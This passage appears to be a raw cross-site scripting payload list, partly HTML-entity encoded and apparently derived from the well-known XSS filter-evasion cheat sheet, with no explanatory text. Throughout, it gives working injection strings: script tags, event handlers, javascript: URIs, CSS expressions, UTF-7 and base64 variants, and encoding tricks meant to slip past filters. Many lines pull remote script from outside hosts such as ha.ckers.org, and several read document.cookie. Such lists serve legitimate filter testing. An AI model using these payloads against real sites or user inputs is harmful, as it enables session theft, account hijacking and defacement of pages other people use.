STYLE='no\\xss&amp;#58;noxss(\\\"*//*\\\");\nxss&amp;#58;ex&amp;#x2F;*XSS*//*/*/pression(alert(\\\"XSS\\\"))'&amp;gt;\n&amp;lt;STYLE TYPE=\\\"text/javascript\\\"&amp;gt;alert('XSS');&amp;lt;/STYLE&amp;gt;\n&amp;lt;STYLE&amp;gt;&amp;#46;XSS{background-image&amp;#58;url(\\\"javascript&amp;#058;alert('XSS')\\\");}&amp;lt;/STYLE&amp;gt;&amp;lt;A CLASS=XSS&amp;gt;&amp;lt;/A&amp;gt;\n&amp;lt;STYLE type=\\\"text/css\\\"&amp;gt;BODY{background&amp;#58;url(\\\"javascript&amp;#058;alert('XSS')\\\")}&amp;lt;/STYLE&amp;gt;\n&amp;lt;!--&amp;#91;if gte IE 4&amp;#93;&amp;gt;\n&amp;lt;SCRIPT&amp;gt;alert('XSS');&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;!&amp;#91;endif&amp;#93;--&amp;gt;\n&amp;lt;BASE HREF=\\\"javascript&amp;#058;alert('XSS');//\\\"&amp;gt;\n&amp;lt;OBJECT TYPE=\\\"text/x-scriptlet\\\" DATA=\\\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/scriptlet&amp;#46;html\\\"&amp;gt;&amp;lt;/OBJECT&amp;gt;\n&amp;lt;OBJECT classid=clsid&amp;#58;ae24fdae-03c6-11d1-8b76-0080c744f389&amp;gt;&amp;lt;param name=url value=javascript&amp;#058;alert('XSS')&amp;gt;&amp;lt;/OBJECT&amp;gt;\n&amp;lt;EMBED SRC=\\\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;swf\\\" AllowScriptAccess=\\\"always\\\"&amp;gt;&amp;lt;/EMBED&amp;gt;\n&amp;lt;EMBED SRC=\\\"data&amp;#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\\\" type=\\\"image/svg+xml\\\" AllowScriptAccess=\\\"always\\\"&amp;gt;&amp;lt;/EMBED&amp;gt;\na=\\\"get\\\";\nb=\\\"URL(\\\\\"\\\";\nc=\\\"javascript&amp;#058;\\\";\nd=\\\"alert('XSS');\\\\\")\\\";\neval(a+b+c+d);\n&amp;lt;HTML xmlns&amp;#58;xss&amp;gt;&amp;lt;?import namespace=\\\"xss\\\" implementation=\\\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;htc\\\"&amp;gt;&amp;lt;xss&amp;#58;xss&amp;gt;XSS&amp;lt;/xss&amp;#58;xss&amp;gt;&amp;lt;/HTML&amp;gt;\n&amp;lt;XML ID=I&amp;gt;&amp;lt;X&amp;gt;&amp;lt;C&amp;gt;&amp;lt;!&amp;#91;CDATA&amp;#91;&amp;lt;IMG SRC=\\\"javas&amp;#93;&amp;#93;&amp;gt;&amp;lt;!&amp;#91;CDATA&amp;#91;cript&amp;#58;alert('XSS');\\\"&amp;gt;&amp;#93;&amp;#93;&amp;gt;\n&amp;lt;/C&amp;gt;&amp;lt;/X&amp;gt;&amp;lt;/xml&amp;gt;&amp;lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&amp;gt;&amp;lt;/SPAN&amp;gt;\n&amp;lt;XML ID=\\\"xss\\\"&amp;gt;&amp;lt;I&amp;gt;&amp;lt;B&amp;gt;&amp;lt;IMG SRC=\\\"javas&amp;lt;!-- --&amp;gt;cript&amp;#58;alert('XSS')\\\"&amp;gt;&amp;lt;/B&amp;gt;&amp;lt;/I&amp;gt;&amp;lt;/XML&amp;gt;\n&amp;lt;SPAN DATASRC=\\\"#xss\\\" DATAFLD=\\\"B\\\" DATAFORMATAS=\\\"HTML\\\"&amp;gt;&amp;lt;/SPAN&amp;gt;\n&amp;lt;XML SRC=\\\"xsstest&amp;#46;xml\\\" ID=I&amp;gt;&amp;lt;/XML&amp;gt;\n&amp;lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&amp;gt;&amp;lt;/SPAN&amp;gt;\n&amp;lt;HTML&amp;gt;&amp;lt;BODY&amp;gt;\n&amp;lt;?xml&amp;#58;namespace prefix=\\\"t\\\" ns=\\\"urn&amp;#58;schemas-microsoft-com&amp;#58;time\\\"&amp;gt;\n&amp;lt;?import namespace=\\\"t\\\" implementation=\\\"#default#time2\\\"&amp;gt;\n&amp;lt;t&amp;#58;set attributeName=\\\"innerHTML\\\" to=\\\"XSS&amp;lt;SCRIPT DEFER&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/SCRIPT&amp;gt;\\\"&amp;gt;\n&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;\n&amp;lt;SCRIPT SRC=\\\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;jpg\\\"&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;!--#exec cmd=\\\"/bin/echo '&amp;lt;SCR'\\\"--&amp;gt;&amp;lt;!--#exec cmd=\\\"/bin/echo 'IPT SRC=http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js&amp;gt;&amp;lt;/SCRIPT&amp;gt;'\\\"--&amp;gt;\n&amp;lt;? echo('&amp;lt;SCR)';\necho('IPT&amp;gt;alert(\\\"XSS\\\")&amp;lt;/SCRIPT&amp;gt;'); ?&amp;gt;\n&amp;lt;IMG SRC=\\\"http&amp;#58;//www&amp;#46;thesiteyouareon&amp;#46;com/somecommand&amp;#46;php?somevariables=maliciouscode\\\"&amp;gt;\nRedirect 302 /a&amp;#46;jpg http&amp;#58;//victimsite&amp;#46;com/admin&amp;#46;asp&amp;deleteuser\n&amp;lt;META HTTP-EQUIV=\\\"Set-Cookie\\\" Content=\\\"USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;\\\"&amp;gt;\n&amp;lt;HEAD&amp;gt;&amp;lt;META HTTP-EQUIV=\\\"CONTENT-TYPE\\\" CONTENT=\\\"text/html; charset=UTF-7\\\"&amp;gt; &amp;lt;/HEAD&amp;gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\n&amp;lt;SCRIPT a=\\\"&amp;gt;\\\" SRC=\\\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\\"&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;SCRIPT =\\\"&amp;gt;\\\" SRC=\\\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\\"&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;SCRIPT a=\\\"&amp;gt;\\\" '' SRC=\\\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\\"&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;SCRIPT \\\"a='&amp;gt;'\\\" SRC=\\\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\\"&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;SCRIPT a=`&amp;gt;` SRC=\\\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\\"&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;SCRIPT a=\\\"&amp;gt;'&amp;gt;\\\" SRC=\\\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\\"&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;SCRIPT&amp;gt;document&amp;#46;write(\\\"&amp;lt;SCRI\\\");&amp;lt;/SCRIPT&amp;gt;PT SRC=\\\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\\"&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;A HREF=\\\"http&amp;#58;//66&amp;#46;102&amp;#46;7&amp;#46;147/\\\"&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=\\\"http&amp;#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\\\"&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=\\\"http&amp;#58;//1113982867/\\\"&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=\\\"http&amp;#58;//0x42&amp;#46;0x0000066&amp;#46;0x7&amp;#46;0x93/\\\"&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=\\\"http&amp;#58;//0102&amp;#46;0146&amp;#46;0007&amp;#46;00000223/\\\"&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=\\\"htt p&amp;#58;//6 6&amp;#46;000146&amp;#46;0x7&amp;#46;147/\\\"&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=\\\"//www&amp;#46;google&amp;#46;com/\\\"&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=\\\"//google\\\"&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=\\\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org@google\\\"&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=\\\"http&amp;#58;//google&amp;#58;ha&amp;#46;ckers&amp;#46;org\\\"&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=\\\"http&amp;#58;//google&amp;#46;com/\\\"&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=\\\"http&amp;#58;//www&amp;#46;google&amp;#46;com&amp;#46;/\\\"&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=\\\"javascript&amp;#058;document&amp;#46;location='http&amp;#58;//www&amp;#46;google&amp;#46;com/'\\\"&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;A HREF=\\\"http&amp;#58;//www&amp;#46;gohttp&amp;#58;//www&amp;#46;google&amp;#46;com/ogle&amp;#46;com/\\\"&amp;gt;XSS&amp;lt;/A&amp;gt;\n&amp;lt;\n%3C\n&amp;lt\n&amp;lt;\n&amp;LT\n&amp;LT;\n&amp;#60\n&amp;#060\n&amp;#0060\n&amp;#00060\n&amp;#000060\n&amp;#0000060\n&amp;lt;\n&amp;#x3c\n&amp;#x03c\n&amp;#x003c\n&amp;#x0003c\n&amp;#x00003c\n&amp;#x000003c\n&amp;#x3c;\n&amp;#x03c;\n&amp;#x003c;\n&amp;#x0003c;\n&amp;#x00003c;\n&amp;#x000003c;\n&amp;#X3c\n&amp;#X03c\n&amp;#X003c\n&amp;#X0003c\n&amp;#X00003c\n&amp;#X000003c\n&amp;#X3c;\n&amp;#X03c;\n&amp;#X003c;\n&amp;#X0003c;\n&amp;#X00003c;\n&amp;#X000003c;\n&amp;#x3C\n&amp;#x03C\n&amp;#x003C\n&amp;#x0003C\n&amp;#x00003C\n&amp;#x000003C\n&amp;#x3C;\n&amp;#x03C;\n&amp;#x003C;\n&amp;#x0003C;\n&amp;#x00003C;\n&amp;#x000003C;\n&amp;#X3C\n&amp;#X03C\n&amp;#X003C\n&amp;#X0003C\n&amp;#X00003C\n&amp;#X000003C\n&amp;#X3C;\n&amp;#X03C;\n&amp;#X003C;\n&amp;#X0003C;\n&amp;#X00003C;\n&amp;#X000003C;\n\\x3c\n\\x3C\n\\u003c\n\\u003C\n&amp;lt;iframe src=http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/scriptlet&amp;#46;html&amp;gt;\n&amp;lt;IMG SRC=\\\"javascript&amp;#058;alert('XSS')\\\"\n&amp;lt;SCRIPT SRC=//ha&amp;#46;ckers&amp;#46;org/&amp;#46;js&amp;gt;\n&amp;lt;SCRIPT SRC=http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js?&amp;lt;B&amp;gt;\n&amp;lt;&amp;lt;SCRIPT&amp;gt;alert(\\\"XSS\\\");//&amp;lt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;SCRIPT/SRC=\\\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\\"&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;BODY onload!#$%&amp;()*~+-_&amp;#46;,&amp;#58;;?@&amp;#91;/|\\&amp;#93;^`=alert(\\\"XSS\\\")&amp;gt;\n&amp;lt;SCRIPT/XSS SRC=\\\"http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js\\\"&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n&amp;lt;IMG SRC=\\\"   javascript&amp;#058;alert('XSS');\\\"&amp;gt;\nperl -e 'print \\\"&amp;lt;SCR\\0IPT&amp;gt;alert(\\\\\"XSS\\\\\")&amp;lt;/SCR\\0IPT&amp;gt;\\\";' &amp;gt; out\nperl -e 'print \\\"&amp;lt;IMG SRC=java\\0script&amp;#058;alert(\\\\\"XSS\\\\\")&amp;gt;\\\";' &amp;gt; out\n&amp;lt;IMG SRC=\\\"jav&amp;#x0D;ascript&amp;#058;alert('XSS');\\\"&amp;gt;\n&amp;lt;IMG SRC=\\\"jav&amp;#x0A;ascript&amp;#058;alert('XSS');\\\"&amp;gt;\n&amp;lt;IMG SRC=\\\"jav&amp;#x09;ascript&amp;#058;alert('XSS');\\\"&amp;gt;\n&amp;lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&amp;gt;\n&amp;lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&amp;gt;\n&amp;lt;IMG SRC=javascript&amp;#058;alert('XSS')&amp;gt;\n&amp;lt;IMG SRC=javascript&amp;#058;alert(String&amp;#46;fromCharCode(88,83,83))&amp;gt;\n&amp;lt;IMG \\\"\\\"\\\"&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(\\\"XSS\\\")&amp;lt;/SCRIPT&amp;gt;\\\"&amp;gt;\n&amp;lt;IMG SRC=`javascript&amp;#058;alert(\\\"RSnake says, 'XSS'\\\")`&amp;gt;\n&amp;lt;IMG SRC=javascript&amp;#058;alert(&amp;quot;XSS&amp;quot;)&amp;gt;\n&amp;lt;IMG SRC=JaVaScRiPt&amp;#058;alert('XSS')&amp;gt;\n&amp;lt;IMG SRC=javascript&amp;#058;alert('XSS')&amp;gt;\n&amp;lt;IMG SRC=\\\"javascript&amp;#058;alert('XSS');\\\"&amp;gt;\n&amp;lt;SCRIPT SRC=http&amp;#58;//ha&amp;#46;ckers&amp;#46;org/xss&amp;#46;js&amp;gt;&amp;lt;/SCRIPT&amp;gt;\n'';!--\\\"&amp;lt;XSS&amp;gt;=&amp;{()}\n';alert(String&amp;#46;fromCharCode(88,83,83))//\\';alert(String&amp;#46;fromCharCode(88,83,83))//\\\";alert(String&amp;#46;fromCharCode(88,83,83))//\\\\\";alert(String&amp;#46;fromCharCode(88,83,83))//--&amp;gt;&amp;lt;/SCRIPT&amp;gt;\\\"&amp;gt;'&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(String&amp;#46;fromCharCode(88,83,83))&amp;lt;/SCRIPT&amp;gt;\n';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;\n'';!--\"&lt;XSS&gt;=&amp;{()}\n&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;\n&lt;IMG SRC=\"javascript:alert('XSS');\"&gt;\n&lt;IMG SRC=javascript:alert('XSS')&gt;\n&lt;IMG SRC=javascrscriptipt:alert('XSS')&gt;\n&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;\n&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;\n&lt;IMG SRC=\" &amp;#14;  javascript:alert('XSS');\"&gt;\n&lt;SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;\n&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;\n\\\";alert('XSS');//\n&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"XSS\");&lt;/SCRIPT&gt;\n\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be\n&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\"&gt;\n&lt;IFRAME SRC=\"javascript:alert('XSS');\"&gt;&lt;/IFRAME&gt;\n&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript:alert('XSS');\"&gt;&lt;/FRAMESET&gt;\n&lt;TABLE BACKGROUND=\"javascript:alert('XSS')\"&gt;\n&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript:alert('XSS')\"&gt;\n&lt;DIV STYLE=\"background-image: url(javascript:alert('XSS'))\"&gt;\n&lt;DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\"&gt;\n&lt;DIV STYLE=\"width: expression(alert('XSS'));\"&gt;\n&lt;STYLE&gt;@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';&lt;/STYLE&gt;\n&lt;IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\"&gt;\n&lt;XSS STYLE=\"xss:expression(alert('XSS'))\"&gt;\nexp/*&lt;A STYLE='no\\xss:noxss(\"*//*\");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;\n&lt;EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;\na=\"get\";b=\"URL(ja\\\"\";c=\"vascr\";d=\"ipt:ale\";e=\"rt('XSS');\\\")\";eval(a+b+c+d+e);\n&lt;SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"&gt;&lt;/SCRIPT&gt;\n&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"&gt;&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;&lt;t:set attributeName=\"innerHTML\" to=\"XSS&amp;lt;SCRIPT DEFER&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/SCRIPT&amp;gt;\"&gt;&lt;/BODY&gt;&lt;/HTML&gt;\n&lt;SCRIPT&gt;document.write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;form id=\"test\" /&gt;&lt;button form=\"test\" formaction=\"javascript:alert(123)\"&gt;TESTHTML5FORMACTION\n&lt;form&gt;&lt;button formaction=\"javascript:alert(123)\"&gt;crosssitespt\n&lt;frameset onload=alert(123)&gt;\n&lt;!--&lt;img src=\"--&gt;&lt;img src=x onerror=alert(123)//\"&gt;\n&lt;style&gt;&lt;img src=\"&lt;/style&gt;&lt;img src=x onerror=alert(123)//\"&gt;\n&lt;object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&gt;\n&lt;embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&gt;\n&lt;embed src=\"javascript:alert(1)\"&gt;\n&lt;? foo=\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;\n&lt;! foo=\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;\n&lt;/ foo=\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;\n&lt;script&gt;({0:#0=alert/#0#/#0#(123)})&lt;/script&gt;\n&lt;script&gt;ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x&lt;/script&gt;\n&lt;script&gt;Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()&lt;/script&gt;\n&lt;script src=\"#\"&gt;{alert(1)}&lt;/script&gt;;1\n&lt;script&gt;crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')&lt;/script&gt;\n&lt;svg xmlns=\"#\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;\n&lt;svg onload=\"javascript:alert(123)\" xmlns=\"#\"&gt;&lt;/svg&gt;\n&lt;iframe xmlns=\"#\" src=\"javascript:alert(1)\"&gt;&lt;/iframe&gt;\n+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-\n%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-\n+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-\n%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-\n%253cscript%253ealert(document.cookie)%253c/script%253e\n\u201c&gt;&lt;s\u201d%2b\u201dcript&gt;alert(document.cookie)&lt;/script&gt;\n\u201c&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/script&gt;\n\u201c&gt;&lt;&lt;script&gt;alert(document.cookie);//&lt;&lt;/script&gt;\nfoo&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;/script&gt;ipt&gt;\n%22/%3E%3CBODY%20onload=\u2019document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)\u2019%3E\n\u2018; alert(document.cookie); var foo=\u2019\nfoo\\\u2019; alert(document.cookie);//\u2019;\n&lt;/script&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;\n&lt;img src=asdf onerror=alert(document.cookie)&gt;\n&lt;BODY ONLOAD=alert(\u2019XSS\u2019)&gt;\n&lt;script&gt;alert(1)&lt;/script&gt;\n\"&gt;&lt;script&gt;alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))&lt;/script&gt;\n&lt;video src=1 onerror=alert(1)&gt;\n&lt;audio src=1 onerror=alert(1)&gt;\n';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;\n'';!--\"&lt;XSS&gt;=&amp;{()}\n0\\\"autofocus/onfocus=alert(1)--&gt;&lt;video/poster/onerror=prompt(2)&gt;\"-confirm(3)-\"\n&lt;script/src=data:,alert()&gt;\n&lt;marquee/onstart=alert()&gt;\n&lt;video/poster/onerror=alert()&gt;\n&lt;isindex/autofocus/onfocus=alert()&gt;\n&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;\n&lt;IMG SRC=\"javascript:alert('XSS');\"&gt;\n&lt;IMG SRC=javascript:alert('XSS')&gt;\n&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;\n&lt;IMG SRC=javascript:alert(\"XSS\")&gt;\n&lt;IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`&gt;\n&lt;a onmouseover=\"alert(document.cookie)\"&gt;xxs link&lt;/a&gt;\n&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;\n&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;\n&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;\n&lt;IMG SRC=# onmouseover=\"alert('xxs')\"&gt;\n&lt;IMG SRC= onmouseover=\"alert('xxs')\"&gt;\n&lt;IMG onmouseover=\"alert('xxs')\"&gt;\n&lt;IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"&gt;&lt;/img&gt;\n&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;\n&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;\n&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;\n#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;\n&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;\n&lt;IMG SRC=\"jav   ascript:alert('XSS');\"&gt;\n&lt;IMG SRC=\"jav&amp;#x09;ascript:alert('XSS');\"&gt;\n&lt;IMG SRC=\"jav&amp;#x0A;ascript:alert('XSS');\"&gt;\n&lt;IMG SRC=\"jav&amp;#x0D;ascript:alert('XSS');\"&gt;\n&lt;IMG SRC=\" &amp;#14;  javascript:alert('XSS');\"&gt;\n&lt;SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")&gt;\n&lt;SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;\n&lt;SCRIPT SRC=http://ha.ckers.org/xss.js?&lt; B &gt;\n&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;\n&lt;IMG SRC=\"javascript:alert('XSS')\"\n&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;\n\\\";alert('XSS');//\n&lt;/script&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;\n&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"XSS\");&lt;/SCRIPT&gt;\n&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\"&gt;\n&lt;BODY BACKGROUND=\"javascript:alert('XSS')\"&gt;\n&lt;IMG DYNSRC=\"javascript:alert('XSS')\"&gt;\n&lt;IMG LOWSRC=\"javascript:alert('XSS')\"&gt;\n&lt;STYLE&gt;li {list-style-image: url(\"javascript:alert('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;\n&lt;IMG SRC='vbscript:msgbox(\"XSS\")'&gt;\n&lt;IMG SRC=\"livescript:[code]\"&gt;\n&lt;BODY ONLOAD=alert('XSS')&gt;\n&lt;BGSOUND SRC=\"javascript:alert('XSS');\"&gt;\n&lt;BR SIZE=\"&amp;{alert('XSS')}\"&gt;\n&lt;LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\"&gt;\n&lt;LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\"&gt;\n&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;\n&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet\"&gt;\n&lt;STYLE&gt;BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}&lt;/STYLE&gt;\n&lt;STYLE&gt;@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';&lt;/STYLE&gt;\n&lt;IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\"&gt;\nexp/*&lt;A STYLE='no\\xss:noxss(\"*//*\");\nxss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'&gt;\n&lt;STYLE TYPE=\"text/javascript\"&gt;alert('XSS');&lt;/STYLE&gt;\n&lt;STYLE&gt;.XSS{background-image:url(\"javascript:alert('XSS')\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;\n&lt;STYLE 